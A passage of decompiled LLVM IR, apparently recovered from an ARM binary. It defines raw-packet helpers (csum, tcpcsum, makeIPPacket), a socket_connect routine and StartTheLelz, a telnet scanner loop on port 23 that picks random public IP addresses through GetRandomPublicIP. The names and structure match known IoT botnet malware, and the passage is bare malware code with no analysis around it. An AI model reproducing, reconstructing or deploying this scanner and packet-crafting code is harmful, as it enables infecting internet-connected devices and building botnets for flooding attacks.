  %v2_ac2c = phi i32 [ 0, %entry ], [ %v2_abd8, %dec_label_pc_abb8 ]
  %stack_var_-32.0.lcssa = phi i8* [ %arg1, %entry ], [ %v5_abf0, %dec_label_pc_abb8 ]
  %stack_var_-40.0.lcssa = phi i32 [ 0, %entry ], [ %v5_abdc, %dec_label_pc_abb8 ]
  %v7_ac04.lcssa.in = phi i32 [ %arg2, %entry ], [ %v1_abf8, %dec_label_pc_abb8 ]
  %v7_ac04.lcssa = icmp eq i32 %v7_ac04.lcssa.in, 1
  br i1 %v7_ac04.lcssa, label %dec_label_pc_ac18, label %dec_label_pc_ac94.preheader

dec_label_pc_ac18:                                ; preds = %dec_label_pc_ac0c
  %v2_ac1c = load i8, i8* %stack_var_-32.0.lcssa, align 1
  %v3_ac1c = zext i8 %v2_ac1c to i32
  %v2_ac30 = add i32 %v3_ac1c, %v2_ac2c
  %v3_ac30 = icmp ult i32 %v2_ac30, %v2_ac2c
  %v4_ac34 = zext i1 %v3_ac30 to i32
  %v5_ac34 = add i32 %v4_ac34, %stack_var_-40.0.lcssa
  br label %dec_label_pc_ac94.preheader

dec_label_pc_ac94.preheader:                      ; preds = %dec_label_pc_ac18, %dec_label_pc_ac0c
  %v3_acc0.ph = phi i32 [ %v2_ac2c, %dec_label_pc_ac0c ], [ %v2_ac30, %dec_label_pc_ac18 ]
  %stack_var_-40.1.ph = phi i32 [ %stack_var_-40.0.lcssa, %dec_label_pc_ac0c ], [ %v5_ac34, %dec_label_pc_ac18 ]
  %v3_ac9836 = mul i32 %stack_var_-40.1.ph, 65536
  %v3_aca037 = udiv i32 %v3_acc0.ph, 65536
  %v2_aca438 = or i32 %v3_ac9836, %v3_aca037
  %v3_acac39 = udiv i32 %stack_var_-40.1.ph, 65536
  %v2_acb440 = or i32 %v2_aca438, %v3_acac39
  %v2_acb841 = icmp eq i32 %v2_acb440, 0
  br i1 %v2_acb841, label %dec_label_pc_acc0, label %dec_label_pc_ac44

dec_label_pc_ac44:                                ; preds = %dec_label_pc_ac94.preheader, %dec_label_pc_ac44
  %v3_acac44 = phi i32 [ %v3_acac, %dec_label_pc_ac44 ], [ %v3_acac39, %dec_label_pc_ac94.preheader ]
  %v2_aca443 = phi i32 [ %v2_aca4, %dec_label_pc_ac44 ], [ %v2_aca438, %dec_label_pc_ac94.preheader ]
  %v3_acc042 = phi i32 [ %v2_ac84, %dec_label_pc_ac44 ], [ %v3_acc0.ph, %dec_label_pc_ac94.preheader ]
  %v2_ac58 = urem i32 %v3_acc042, 65536
  %v2_ac84 = add i32 %v2_aca443, %v2_ac58
  %v3_ac84 = icmp ult i32 %v2_ac84, %v2_ac58
  %v4_ac88 = zext i1 %v3_ac84 to i32
  %v5_ac88 = add nuw nsw i32 %v4_ac88, %v3_acac44
  %v3_ac98 = mul i32 %v5_ac88, 65536
  %v3_aca0 = udiv i32 %v2_ac84, 65536
  %v2_aca4 = or i32 %v3_ac98, %v3_aca0
  %v3_acac = udiv i32 %v5_ac88, 65536
  %v2_acb4 = or i32 %v2_aca4, %v3_acac
  %v2_acb8 = icmp eq i32 %v2_acb4, 0
  br i1 %v2_acb8, label %dec_label_pc_ac94.dec_label_pc_acc0_crit_edge, label %dec_label_pc_ac44

dec_label_pc_ac94.dec_label_pc_acc0_crit_edge:    ; preds = %dec_label_pc_ac44
  br label %dec_label_pc_acc0

dec_label_pc_acc0:                                ; preds = %dec_label_pc_ac94.dec_label_pc_acc0_crit_edge, %dec_label_pc_ac94.preheader
  %v3_acc0.lcssa = phi i32 [ %v2_ac84, %dec_label_pc_ac94.dec_label_pc_acc0_crit_edge ], [ %v3_acc0.ph, %dec_label_pc_ac94.preheader ]
  %v1_accc = urem i32 %v3_acc0.lcssa, 65536
  %v3_acd4 = xor i32 %v1_accc, 65535
  ret i32 %v3_acd4

; uselistorder directives
  uselistorder i32 %v2_aca4, { 1, 0 }
  uselistorder i32 %v5_ac88, { 1, 0 }
  uselistorder i32 %v2_ac84, { 2, 0, 3, 1 }
  uselistorder i32 %v3_acac39, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.ph, { 1, 0 }
  uselistorder i32 %v3_acc0.ph, { 2, 1, 0 }
  uselistorder i32 %v2_ac2c, { 0, 2, 1 }
  uselistorder i32 %v1_abf8, { 0, 2, 1 }
  uselistorder i32 %v2_abd8, { 0, 2, 1 }
  uselistorder i32 %v2_abd4, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_ac44, { 1, 0 }
  uselistorder label %dec_label_pc_abb8, { 1, 0 }
}

define i32 @tcpcsum(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_ace8 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-52, align 4
  %v1_ad20 = add i32 %arg1, 12
  %v2_ad20 = inttoptr i32 %v1_ad20 to i32*
  %v3_ad20 = load i32, i32* %v2_ad20, align 4
  store i32 %v3_ad20, i32* %stack_var_-44, align 4
  %v1_ad48 = call i32 @htons(i32 20)
  %v1_ad6c = call i32 @malloc(i32 32)
  %v2_ad7c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v1_ad6c, i32* @r0, align 4
  store i32 %v2_ad7c, i32* @r1, align 4
  store i32 12, i32* @r2, align 4
  %v0_ad90 = call i32 @memcpy()
  %v1_ad98 = add i32 %v1_ad6c, 12
  %v3_ad9c = load i32, i32* %stack_var_-52, align 4
  store i32 %v1_ad98, i32* @r0, align 4
  store i32 %v3_ad9c, i32* @r1, align 4
  store i32 20, i32* @r2, align 4
  %v0_adb0 = call i32 @memcpy()
  %v2_adbc = inttoptr i32 %v1_ad6c to i8*
  %v3_adbc = call i32 @csum(i8* %v2_adbc, i32 32)
  %sext2 = mul i32 %v3_adbc, 16777216
  %v3_adc8 = ashr i32 %sext2, 31
  store i32 %v1_ad6c, i32* @r0, align 4
  %v0_add4 = call i32 @free()
  %v3_addc = sdiv i32 %sext2, 16777216
  %v4_ade0 = mul nsw i32 %v3_adc8, 256
  %v4_ade4 = and i32 %v4_ade0, 65280
  %v5_ade4 = or i32 %v4_ade4, %v3_addc
  store i32 %v3_ace8, i32* @fp, align 4
  ret i32 %v5_ade4

; uselistorder directives
  uselistorder i32 %sext2, { 1, 0 }
  uselistorder i32 %v1_ad6c, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
}

define i32 @makeIPPacket(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = trunc i32 %arg4 to i8
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp5 = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %v3_adf8 = load i32, i32* @fp, align 4
  store i32 %tmp5, i32* %r2.global-to-local, align 4
  %v2_ae18 = load i8, i8* %arg1, align 1
  %v4_ae20 = zext i8 %v2_ae18 to i32
  %v1_ae24 = and i32 %v4_ae20, 240
  %v1_ae28 = or i32 %v1_ae24, 5
  store i32 %v1_ae28, i32* %r3.global-to-local, align 4
  %v1_ae34 = trunc i32 %v1_ae28 to i8
  store i8 %v1_ae34, i8* %arg1, align 1
  store i32 %tmp5, i32* %r2.global-to-local, align 4
  store i8 69, i8* %arg1, align 1
  %v3_ae64 = add i32 %tmp5, 1
  %v4_ae64 = inttoptr i32 %v3_ae64 to i8*
  store i8 0, i8* %v4_ae64, align 1
  %v3_ae68 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_ae68, 20
  %v3_ae7c = urem i32 %fold, 65536
  store i32 %v3_ae7c, i32* %r3.global-to-local, align 4
  store i32 %tmp5, i32* %r2.global-to-local, align 4
  %v1_ae84 = trunc i32 %fold to i8
  %v3_ae84 = add i32 %tmp5, 2
  %v4_ae84 = inttoptr i32 %v3_ae84 to i8*
  store i8 %v1_ae84, i8* %v4_ae84, align 1
  %v0_ae88 = load i32, i32* %r3.global-to-local, align 4
  %v3_ae88 = sdiv i32 %v0_ae88, 256
  store i32 %v3_ae88, i32* %r3.global-to-local, align 4
  %v1_ae8c = trunc i32 %v3_ae88 to i8
  %v2_ae8c = load i32, i32* %r2.global-to-local, align 4
  %v3_ae8c = add i32 %v2_ae8c, 3
  %v4_ae8c = inttoptr i32 %v3_ae8c to i8*
  store i8 %v1_ae8c, i8* %v4_ae8c, align 1
  %v0_ae90 = call i32 @rand_cmwc()
  %v3_ae9c = urem i32 %v0_ae90, 65536
  store i32 %v3_ae9c, i32* %r3.global-to-local, align 4
  store i32 %tmp5, i32* %r2.global-to-local, align 4
  %v1_aea4 = trunc i32 %v0_ae90 to i8
  %v3_aea4 = add i32 %tmp5, 4
  %v4_aea4 = inttoptr i32 %v3_aea4 to i8*
  store i8 %v1_aea4, i8* %v4_aea4, align 1
  %v0_aea8 = load i32, i32* %r3.global-to-local, align 4
  %v3_aea84 = udiv i32 %v0_aea8, 256
  %v1_aeac = trunc i32 %v3_aea84 to i8
  %v2_aeac = load i32, i32* %r2.global-to-local, align 4
  %v3_aeac = add i32 %v2_aeac, 5
  %v4_aeac = inttoptr i32 %v3_aeac to i8*
  store i8 %v1_aeac, i8* %v4_aeac, align 1
  store i32 %tmp5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_aeb8 = add i32 %tmp5, 6
  %v4_aeb8 = inttoptr i32 %v3_aeb8 to i8*
  store i8 0, i8* %v4_aeb8, align 1
  %v0_aebc = load i32, i32* %r3.global-to-local, align 4
  %v1_aebc = trunc i32 %v0_aebc to i8
  %v2_aebc = load i32, i32* %r2.global-to-local, align 4
  %v3_aebc = add i32 %v2_aebc, 7
  %v4_aebc = inttoptr i32 %v3_aebc to i8*
  store i8 %v1_aebc, i8* %v4_aebc, align 1
  %v3_aec8 = add i32 %tmp5, 8
  %v4_aec8 = inttoptr i32 %v3_aec8 to i8*
  store i8 -1, i8* %v4_aec8, align 1
  %v3_aed4 = add i32 %tmp5, 9
  %v4_aed4 = inttoptr i32 %v3_aed4 to i8*
  store i8 %tmp, i8* %v4_aed4, align 1
  store i32 %tmp5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_aee0 = add i32 %tmp5, 10
  %v4_aee0 = inttoptr i32 %v3_aee0 to i8*
  store i8 0, i8* %v4_aee0, align 1
  %v0_aee4 = load i32, i32* %r3.global-to-local, align 4
  %v1_aee4 = trunc i32 %v0_aee4 to i8
  %v2_aee4 = load i32, i32* %r2.global-to-local, align 4
  %v3_aee4 = add i32 %v2_aee4, 11
  %v4_aee4 = inttoptr i32 %v3_aee4 to i8*
  store i8 %v1_aee4, i8* %v4_aee4, align 1
  %v2_aef0 = add i32 %tmp5, 12
  %v3_aef0 = inttoptr i32 %v2_aef0 to i32*
  store i32 %arg3, i32* %v3_aef0, align 4
  store i32 %tmp5, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_aefc = add i32 %tmp5, 16
  %v3_aefc = inttoptr i32 %v2_aefc to i32*
  store i32 %arg2, i32* %v3_aefc, align 4
  store i32 %v3_adf8, i32* @fp, align 4
  ret i32 %v0_ae90

; uselistorder directives
  uselistorder i32 %v0_ae90, { 1, 2, 0 }
  uselistorder i32 %v3_ae88, { 1, 0 }
  uselistorder i32 %fold, { 1, 0 }
  uselistorder i32 %tmp5, { 1, 0, 2, 4, 3, 5, 6, 8, 7, 10, 9, 12, 11, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 %arg4, { 1, 0 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %v8_af24 = icmp sgt i32 %arg1, 2
  br i1 %v8_af24, label %dec_label_pc_af34, label %dec_label_pc_af44

dec_label_pc_af34:                                ; preds = %entry
  %v1_af38 = call i32 @__libc_close(i32 %arg1)
  br label %dec_label_pc_af44

dec_label_pc_af44:                                ; preds = %entry, %dec_label_pc_af34
  %storemerge1 = phi i32 [ 0, %dec_label_pc_af34 ], [ 1, %entry ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder label %dec_label_pc_af44, { 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_af58 = load i32, i32* @fp, align 4
  store i32 44896, i32* %stack_var_-4, align 4
  %v2_af5c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_af5c, i32* @fp, align 4
  store i32 1, i32* %stack_var_-44, align 4
  %v1_af84 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_af94 = icmp eq i32 %v1_af84, 0
  br i1 %v2_af94, label %dec_label_pc_af9c, label %dec_label_pc_afa8

dec_label_pc_af9c:                                ; preds = %entry
  br label %dec_label_pc_b090

dec_label_pc_afa8:                                ; preds = %entry
  %tmp = sext i8 %arg2 to i32
  %v1_afac = add i32 %v1_af84, 16
  %v2_afac = inttoptr i32 %v1_afac to i32*
  %v3_afac = load i32, i32* %v2_afac, align 4
  %v1_afb0 = inttoptr i32 %v3_afac to i32*
  %v2_afb0 = load i32, i32* %v1_afb0, align 4
  %v1_afb8 = add i32 %v1_af84, 12
  %v2_afb8 = inttoptr i32 %v1_afb8 to i32*
  %v3_afb8 = load i32, i32* %v2_afb8, align 4
  store i32 %v3_afb8, i32* @r2, align 4
  %v2_afc4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_afd0 = call i32 @bcopy(i32 %v2_afb0, i32 %v2_afc4, i32 %v3_afb8)
  %v1_afe8 = call i32 @htons(i32 %tmp)
  store i32 2, i32* %stack_var_-40, align 4
  %v0_b018 = call i32 @socket()
  %v2_b024 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_b024, i32* @ip, align 4
  %v6_b040 = call i32 @__GI_setsockopt(i32 %v0_b018, i32 6, i32 1, i32* nonnull %stack_var_-44, i32 4)
  %v3_b048 = icmp eq i32 %v0_b018, -1
  br i1 %v3_b048, label %dec_label_pc_b050, label %dec_label_pc_b05c

dec_label_pc_b050:                                ; preds = %dec_label_pc_afa8
  br label %dec_label_pc_b090

dec_label_pc_b05c:                                ; preds = %dec_label_pc_afa8
  %v3_b06c = bitcast i32* %stack_var_-40 to %sockaddr*
  %v4_b06c = call i32 @__libc_connect(i32 %v0_b018, %sockaddr* %v3_b06c, i32 16)
  %v3_b074 = icmp eq i32 %v4_b06c, -1
  br i1 %v3_b074, label %dec_label_pc_b07c, label %dec_label_pc_b088

dec_label_pc_b07c:                                ; preds = %dec_label_pc_b05c
  br label %dec_label_pc_b090

dec_label_pc_b088:                                ; preds = %dec_label_pc_b05c
  br label %dec_label_pc_b090

dec_label_pc_b090:                                ; preds = %dec_label_pc_b07c, %dec_label_pc_b050, %dec_label_pc_af9c, %dec_label_pc_b088
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_af9c ], [ 0, %dec_label_pc_b050 ], [ 0, %dec_label_pc_b07c ], [ %v0_b018, %dec_label_pc_b088 ]
  store i32 %v3_af58, i32* @fp, align 4
  ret i32 %stack_var_-56.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1 }
  uselistorder label %dec_label_pc_b090, { 3, 0, 1, 2 }
}

define i32 @StartTheLelz(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-324 = alloca i32, align 4
  %stack_var_-604 = alloca i32, align 4
  %stack_var_-612 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_b0a0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_b0a0, i32* %ip.global-to-local, align 4
  %v3_b0a4 = load i32, i32* @r4, align 4
  store i32 %v3_b0a4, i32* %stack_var_-24, align 4
  store i32 45228, i32* %stack_var_-4, align 4
  %v19_b0a4 = ptrtoint i32* %stack_var_-24 to i32
  %v2_b0a8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_b0a8, i32* @fp, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_b0c4 = call i32 @__GI_time(i32* null)
  store i32 %v2_b0c4, i32* %r3.global-to-local, align 4
  store i32 %v2_b0c4, i32* @r4, align 4
  %v0_b0d0 = call i32 @rand_cmwc()
  %v0_b0d8 = load i32, i32* @r4, align 4
  %v2_b0d8 = xor i32 %v0_b0d8, %v0_b0d0
  store i32 %v2_b0d8, i32* %r3.global-to-local, align 4
  %v1_b0e0 = call i32 @srand(i32 %v2_b0d8)
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-612, align 4
  %v1_b0f8 = call i32 @htons(i32 23)
  %v2_b110 = ptrtoint i32* %stack_var_-604 to i32
  store i32 %v2_b110, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-604, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_b12c = call i32 @malloc(i32 1025)
  store i32 1025, i32* %r3.global-to-local, align 4
  store i32 1025, i32* @r2, align 4
  %v2_b154 = inttoptr i32 %v1_b12c to i8*
  %v3_b154 = call i32 @__GI_memset(i8* %v2_b154, i32 0)
  %v2_b164 = mul i32 %arg2, 28
  %v1_b168 = or i32 %v2_b164, 3
  %v1_b16c = add i32 %v1_b168, 3
  %v3_b170 = and i32 %v1_b16c, -4
  %v1_b178 = load i32, i32* @sp, align 4
  %v2_b178 = sub i32 %v1_b178, %v3_b170
  %v1_b188 = add i32 %v2_b178, 7
  %v3_b18c = and i32 %v1_b188, -4
  %v2_b1b0 = mul i32 %arg2, 5
  store i32 %v2_b1b0, i32* %r3.global-to-local, align 4
  store i32 %v2_b1b0, i32* @r2, align 4
  %v2_b1c4 = inttoptr i32 %v3_b18c to i8*
  %v3_b1c4 = call i32 @__GI_memset(i8* %v2_b1c4, i32 0)
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v5_b2a461 = icmp sgt i32 %arg2, 0
  br i1 %v5_b2a461, label %dec_label_pc_b1d4, label %dec_label_pc_b2a8

dec_label_pc_b1d4:                                ; preds = %entry, %dec_label_pc_b1d4
  %storemerge462 = phi i32 [ %v1_b290, %dec_label_pc_b1d4 ], [ 0, %entry ]
  %v2_b1e4 = mul i32 %storemerge462, 28
  %v2_b1e8 = add i32 %v2_b1e4, %v3_b18c
  store i32 %v2_b1e8, i32* %r3.global-to-local, align 4
  %v2_b1f0 = inttoptr i32 %v2_b1e8 to i32*
  store i32 0, i32* %v2_b1f0, align 4
  %v0_b1f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b1f4 = add i32 %v0_b1f4, 4
  store i32 %v1_b1f4, i32* %r3.global-to-local, align 4
  %v2_b1fc = inttoptr i32 %v1_b1f4 to i32*
  store i32 0, i32* %v2_b1fc, align 4
  %v0_b200 = load i32, i32* %r3.global-to-local, align 4
  %v1_b200 = add i32 %v0_b200, 4
  store i32 %v1_b200, i32* %r3.global-to-local, align 4
  %v2_b208 = inttoptr i32 %v1_b200 to i32*
  store i32 0, i32* %v2_b208, align 4
  %v0_b20c = load i32, i32* %r3.global-to-local, align 4
  %v1_b20c = add i32 %v0_b20c, 4
  store i32 %v1_b20c, i32* %r3.global-to-local, align 4
  %v2_b214 = inttoptr i32 %v1_b20c to i32*
  store i32 0, i32* %v2_b214, align 4
  %v0_b218 = load i32, i32* %r3.global-to-local, align 4
  %v1_b218 = add i32 %v0_b218, 4
  store i32 %v1_b218, i32* %r3.global-to-local, align 4
  %v2_b220 = inttoptr i32 %v1_b218 to i32*
  store i32 0, i32* %v2_b220, align 4
  %v0_b224 = load i32, i32* %r3.global-to-local, align 4
  %v1_b224 = add i32 %v0_b224, 4
  store i32 %v1_b224, i32* %r3.global-to-local, align 4
  %v2_b22c = inttoptr i32 %v1_b224 to i32*
  store i32 0, i32* %v2_b22c, align 4
  %v0_b230 = load i32, i32* %r3.global-to-local, align 4
  %v1_b230 = add i32 %v0_b230, 4
  %v2_b238 = inttoptr i32 %v1_b230 to i32*
  store i32 0, i32* %v2_b238, align 4
  %v3_b260 = add i32 %v2_b1e8, 9
  %v4_b260 = inttoptr i32 %v3_b260 to i8*
  store i8 1, i8* %v4_b260, align 1
  %v2_b280 = add i32 %v2_b1e8, 24
  %v2_b288 = inttoptr i32 %v2_b280 to i32*
  store i32 %v1_b12c, i32* %v2_b288, align 4
  %v1_b290 = add nuw nsw i32 %storemerge462, 1
  store i32 %v1_b290, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v5_b2a4 = icmp slt i32 %v1_b290, %arg2
  br i1 %v5_b2a4, label %dec_label_pc_b1d4, label %dec_label_pc_b2a8

dec_label_pc_b2a8:                                ; preds = %dec_label_pc_b1d4, %entry
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b2b0

dec_label_pc_b2b0:                                ; preds = %dec_label_pc_b2b0, %dec_label_pc_b2a8
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_b2a8 ], [ %v1_b2b4, %dec_label_pc_b2b0 ]
  %v1_b2b4 = add i32 %stack_var_-56.0, 1
  store i32 %v1_b2b4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([10 x i8*]* @global_var_22440.91 to i32), i32* %r3.global-to-local, align 4
  %v4_b2c4 = mul i32 %v1_b2b4, 4
  %v5_b2c4 = add i32 %v4_b2c4, ptrtoint ([10 x i8*]* @global_var_22440.91 to i32)
  %v6_b2c4 = inttoptr i32 %v5_b2c4 to i32*
  %v7_b2c4 = load i32, i32* %v6_b2c4, align 4
  store i32 %v7_b2c4, i32* %r3.global-to-local, align 4
  %v2_b2c8 = icmp eq i32 %v7_b2c4, 0
  br i1 %v2_b2c8, label %dec_label_pc_b2d0.preheader, label %dec_label_pc_b2b0

dec_label_pc_b2d0.preheader:                      ; preds = %dec_label_pc_b2b0
  %v2_b358 = add i32 %v3_b18c, 8
  %v2_b68c = add i32 %v3_b18c, 4
  %v3_b77c = bitcast i32* %stack_var_-612 to %sockaddr*
  %v2_b7ec = ptrtoint i32* %stack_var_-324 to i32
  %v2_b8e8 = ptrtoint i32* %stack_var_-332 to i32
  %v2_b944 = ptrtoint i32* %stack_var_-340 to i32
  %v2_b948 = ptrtoint i32* %stack_var_-336 to i32
  %v2_ba64 = add i32 %v3_b18c, 16
  %v2_bae0 = add i32 %v3_b18c, 24
  br label %dec_label_pc_b2d0

dec_label_pc_b2d0:                                ; preds = %dec_label_pc_b2d0, %dec_label_pc_c460, %dec_label_pc_b2d0.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v5_b2a461, label %dec_label_pc_b2dc, label %dec_label_pc_b2d0

dec_label_pc_b2dc:                                ; preds = %dec_label_pc_b2d0, %dec_label_pc_c460
  %storemerge553 = phi i32 [ %v1_c464, %dec_label_pc_c460 ], [ 0, %dec_label_pc_b2d0 ]
  %v3_b2e8 = mul i32 %storemerge553, 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  %v2_b2f0 = mul i32 %storemerge553, 28
  %v2_b2f4 = add i32 %v2_b2f0, %v3_b18c
  %v2_b2f8 = add i32 %v2_b2f4, 16
  store i32 %v2_b2f8, i32* %r3.global-to-local, align 4
  %v1_b2fc = inttoptr i32 %v2_b2f8 to i32*
  %v2_b2fc = load i32, i32* %v1_b2fc, align 4
  store i32 %v2_b2fc, i32* %r3.global-to-local, align 4
  %v2_b300 = icmp eq i32 %v2_b2fc, 0
  br i1 %v2_b300, label %dec_label_pc_b308, label %dec_label_pc_b340

dec_label_pc_b308:                                ; preds = %dec_label_pc_b2dc
  store i32 %storemerge553, i32* @r4, align 4
  %v2_b310 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_b324 = load i32, i32* @r4, align 4
  %v3_b328 = mul i32 %v0_b324, 4
  store i32 %v3_b328, i32* %r2.global-to-local, align 4
  %v2_b330 = mul i32 %v0_b324, 28
  %v2_b338 = add i32 %v2_ba64, %v2_b330
  store i32 %v2_b338, i32* %r3.global-to-local, align 4
  %v2_b33c = inttoptr i32 %v2_b338 to i32*
  store i32 %v2_b310, i32* %v2_b33c, align 4
  br label %dec_label_pc_b340

dec_label_pc_b340:                                ; preds = %dec_label_pc_b2dc, %dec_label_pc_b308
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  %v2_b35c = add i32 %v2_b358, %v2_b2f0
  store i32 %v2_b35c, i32* %r3.global-to-local, align 4
  %v1_b360 = inttoptr i32 %v2_b35c to i8*
  %v2_b360 = load i8, i8* %v1_b360, align 4
  %v3_b360 = sext i8 %v2_b360 to i32
  %v4_b360 = zext i8 %v2_b360 to i32
  store i32 %v4_b360, i32* %r3.global-to-local, align 4
  switch i32 %v3_b360, label %dec_label_pc_c460 [
    i32 0, label %dec_label_pc_b390
    i32 1, label %dec_label_pc_b800.lr.ph
    i32 2, label %dec_label_pc_baac
    i32 3, label %dec_label_pc_bbf8
    i32 4, label %dec_label_pc_bd4c
    i32 5, label %dec_label_pc_be98
    i32 6, label %dec_label_pc_bfec
    i32 7, label %dec_label_pc_c2f0
  ]

dec_label_pc_b390:                                ; preds = %dec_label_pc_b340
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  %v2_b3ac = add i32 %v2_b2f4, 8
  store i32 %v2_b3ac, i32* %r3.global-to-local, align 4
  %v1_b3b0 = add i32 %v2_b2f4, 9
  %v2_b3b0 = inttoptr i32 %v1_b3b0 to i8*
  %v3_b3b0 = load i8, i8* %v2_b3b0, align 1
  %v7_b3b4 = icmp eq i8 %v3_b3b0, 1
  store i32 %storemerge553, i32* %r3.global-to-local, align 4
  br i1 %v7_b3b4, label %dec_label_pc_b3bc, label %dec_label_pc_b4a8

dec_label_pc_b3bc:                                ; preds = %dec_label_pc_b390
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  %v2_b3d8 = add i32 %v2_b2f4, 24
  store i32 %v2_b3d8, i32* %r3.global-to-local, align 4
  %v1_b3dc = inttoptr i32 %v2_b3d8 to i32*
  %v2_b3dc = load i32, i32* %v1_b3dc, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v2_b400 = inttoptr i32 %v2_b2f4 to i32*
  store i32 0, i32* %v2_b400, align 4
  %v0_b404 = load i32, i32* %r3.global-to-local, align 4
  %v1_b404 = add i32 %v0_b404, 4
  store i32 %v1_b404, i32* %r3.global-to-local, align 4
  %v2_b40c = inttoptr i32 %v1_b404 to i32*
  store i32 0, i32* %v2_b40c, align 4
  %v0_b410 = load i32, i32* %r3.global-to-local, align 4
  %v1_b410 = add i32 %v0_b410, 4
  store i32 %v1_b410, i32* %r3.global-to-local, align 4
  %v2_b418 = inttoptr i32 %v1_b410 to i32*
  store i32 0, i32* %v2_b418, align 4
  %v0_b41c = load i32, i32* %r3.global-to-local, align 4
  %v1_b41c = add i32 %v0_b41c, 4
  store i32 %v1_b41c, i32* %r3.global-to-local, align 4
  %v2_b424 = inttoptr i32 %v1_b41c to i32*
  store i32 0, i32* %v2_b424, align 4
  %v0_b428 = load i32, i32* %r3.global-to-local, align 4
  %v1_b428 = add i32 %v0_b428, 4
  store i32 %v1_b428, i32* %r3.global-to-local, align 4
  %v2_b430 = inttoptr i32 %v1_b428 to i32*
  store i32 0, i32* %v2_b430, align 4
  %v0_b434 = load i32, i32* %r3.global-to-local, align 4
  %v1_b434 = add i32 %v0_b434, 4
  store i32 %v1_b434, i32* %r3.global-to-local, align 4
  %v2_b43c = inttoptr i32 %v1_b434 to i32*
  store i32 0, i32* %v2_b43c, align 4
  %v0_b440 = load i32, i32* %r3.global-to-local, align 4
  %v1_b440 = add i32 %v0_b440, 4
  %v2_b448 = inttoptr i32 %v1_b440 to i32*
  store i32 0, i32* %v2_b448, align 4
  store i32 %v2_b3d8, i32* %r2.global-to-local, align 4
  store i32 %v2_b3dc, i32* %r3.global-to-local, align 4
  store i32 %v2_b3dc, i32* %v1_b3dc, align 4
  store i32 %storemerge553, i32* @r4, align 4
  %v5_b478 = call i32 @GetRandomPublicIP(i32 24, i32 %v3_b18c, i32 %v2_b3d8, i32 %v2_b3dc, i32 %v2_b3dc)
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_b488 = load i32, i32* @r4, align 4
  %v3_b48c = mul i32 %v0_b488, 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_b494 = mul i32 %v0_b488, 28
  %v2_b49c = add i32 %v2_b68c, %v2_b494
  store i32 %v2_b49c, i32* %r3.global-to-local, align 4
  %v2_b4a0 = inttoptr i32 %v2_b49c to i32*
  store i32 %v5_b478, i32* %v2_b4a0, align 4
  br label %dec_label_pc_b634

